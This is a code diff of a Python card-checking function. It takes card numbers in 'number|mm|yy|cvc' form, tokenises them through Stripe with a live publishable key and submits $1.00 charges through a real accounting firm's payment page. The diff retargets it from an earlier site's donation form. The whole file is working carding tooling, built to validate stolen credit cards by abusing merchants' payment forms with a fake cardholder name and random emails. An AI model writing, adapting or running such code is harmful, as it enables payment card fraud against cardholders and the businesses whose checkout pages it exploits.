@@ -8,15 +8,39 @@ def Tele(ccx):
 	cvc = ccx.split("|")[3]
 	if "20" in yy:#Mo3gza
 		yy = yy.split("20")[1]
+	if "01" in mm or "02" in mm or "03" in mm or "04" in mm or "05" in mm or "06" in mm or "07" in mm or "08" in mm or "09" in mm:
+		mm = mm.split("0")[1]
 	r = requests.session()
 	
 	random_amount1 = random.randint(1, 9)
 	random_amount2 = random.randint(1, 99)
 
 	headers = {
+	    'authority': 'www.pbaccountant.com.au',
+	    'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
+	    'accept-language': 'en-TH,en;q=0.9,th-DZ;q=0.8,th;q=0.7,en-GB;q=0.6,en-US;q=0.5',
+	    'cache-control': 'max-age=0',
+	    'referer': 'https://www.google.com/',
+	    'sec-ch-ua': '"Not A(Brand";v="8", "Chromium";v="132"',
+	    'sec-ch-ua-mobile': '?1',
+	    'sec-ch-ua-platform': '"Android"',
+	    'sec-fetch-dest': 'document',
+	    'sec-fetch-mode': 'navigate',
+	    'sec-fetch-site': 'cross-site',
+	    'sec-fetch-user': '?1',
+	    'upgrade-insecure-requests': '1',
+	    'user-agent': 'Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/132.0.0.0 Mobile Safari/537.36',
+	}
+	
+	response = requests.get('https://www.pbaccountant.com.au/payments', headers=headers)
+	
+	RequestVerificationToken = re.search(r'name="__RequestVerificationToken" type="hidden" value="(.*?)"', response.text).group(1)
+	#print(RequestVerificationToken)
+	
+	headers = {
 	    'authority': 'api.stripe.com',
 	    'accept': 'application/json',
-	    'accept-language': 'en-TH,en;q=0.9,th-DZ;q=0.8,th;q=0.7,en-GB;q=0.6,en-US;q=0.5',
+	    'accept-language': 'en-US',
 	    'content-type': 'application/x-www-form-urlencoded',
 	    'origin': 'https://js.stripe.com',
 	    'referer': 'https://js.stripe.com/',
@@ -29,49 +53,44 @@ def Tele(ccx):
 	    'user-agent': 'Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/132.0.0.0 Mobile Safari/537.36',
 	}
 	
-	data = f'type=card&card[number]={n}&card[cvc]={cvc}&card[exp_month]={mm}&card[exp_year]={yy}&payment_user_agent=stripe.js%2F5cceeecc6c%3B+stripe-js-v3%2F5cceeecc6c%3B+card-element&key=pk_live_51P8IPZH1vCzvxZYyDn4BNA1FmPomApUnZyHzE0sM8lo1W85oMSZOUBUhy8wL4VxYob9tY1g7bdInCsnOTztCGtnd00KH92QIUK'
+	data = f'time_on_page=62388&guid=1e245c59-b3c1-4ff9-a09f-db1ae116ea9834ff9b&muid=9be692ec-080b-4770-9c3d-49976a98b32b7258f8&sid=db5cdfd8-03f4-4d15-bc2d-a15049fd9e9db7415b&key=pk_live_NqLPVp9OhWjmctcO4K5egggi&payment_user_agent=stripe.js%2F78ef418&card[name]=Dao+Khao+Saard&card[number]={n}&card[cvc]={cvc}&card[exp_month]={mm}&card[exp_year]=20{yy}'
 	
-	response = requests.post('https://api.stripe.com/v1/payment_methods', headers=headers, data=data)
+	response = requests.post('https://api.stripe.com/v1/tokens', headers=headers, data=data)
 	
-	pm = response.json()['id']
+	tok = response.json()['id']
 	
 	headers = {
-	    'authority': 'community.interestofjustice.org',
-	    'accept': '*/*',
+	    'authority': 'www.pbaccountant.com.au',
+	    'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
 	    'accept-language': 'en-TH,en;q=0.9,th-DZ;q=0.8,th;q=0.7,en-GB;q=0.6,en-US;q=0.5',
-	    'content-type': 'application/x-www-form-urlencoded; charset=UTF-8',
-	    'origin': 'https://community.interestofjustice.org',
-	    'referer': 'https://community.interestofjustice.org/',
+	    'cache-control': 'max-age=0',
+	    'content-type': 'application/x-www-form-urlencoded',
+	    'origin': 'https://www.pbaccountant.com.au',
+	    'referer': 'https://www.pbaccountant.com.au/payments',
 	    'sec-ch-ua': '"Not A(Brand";v="8", "Chromium";v="132"',
 	    'sec-ch-ua-mobile': '?1',
 	    'sec-ch-ua-platform': '"Android"',
-	    'sec-fetch-dest': 'empty',
-	    'sec-fetch-mode': 'cors',
+	    'sec-fetch-dest': 'document',
+	    'sec-fetch-mode': 'navigate',
 	    'sec-fetch-site': 'same-origin',
+	    'sec-fetch-user': '?1',
+	    'upgrade-insecure-requests': '1',
 	    'user-agent': 'Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/132.0.0.0 Mobile Safari/537.36',
-	    'x-requested-with': 'XMLHttpRequest',
-	}
-	
-	params = {
-	    't': '1747981628337',
 	}
 	
 	data = {
-	    'data': f'__fluent_form_embded_post_id=27&_fluentform_2_fluentformnonce=7a0634d5c7&_wp_http_referer=%2F&names%5Bfirst_name%5D=&names%5Blast_name%5D=&email=rodamuser{random_amount1}{random_amount2}%40gmail.com&country-list=&payment_input_2=Free&payment_input=4&payment_input_custom_4=0.5&payment_method=stripe&email_1=&__stripe_payment_method_id={pm}',
-	    'action': 'fluentform_submit',
-	    'form_id': '2',
+	    '__RequestVerificationToken': f'{RequestVerificationToken}',
+	    'CardTypes': 'Visa, MasterCard, American Express',
+	    'PublishableKey': 'pk_live_NqLPVp9OhWjmctcO4K5egggi',
+	    'Token': f'{tok}',
+	    'TokenCreationErrorMessage': '',
+	    'InvoiceNumber': '1',
+	    'Amount': '1.00',
+	    'EmailAddress': f'rodamuser{random_amount1}{random_amount2}@gmail.com',
+	    'CardHolderName': 'Dao Khao Saard',
 	}
 	
-	response = requests.post(
-	    'https://community.interestofjustice.org/wp-admin/admin-ajax.php',
-	    params=params,
-	    headers=headers,
-	    data=data,
-	)
+	response = requests.post('https://www.pbaccountant.com.au/Payments', headers=headers, data=data)
 	
-	try:
-		result = re.search(r'"errors":"Stripe Error: (.*?)"', response.text).group(1)
-	except:
-		result = response.text
-	
+	result = re.search(r'<p class="Callout">(.*?)</p>', response.text).group(1)
 	return (result)
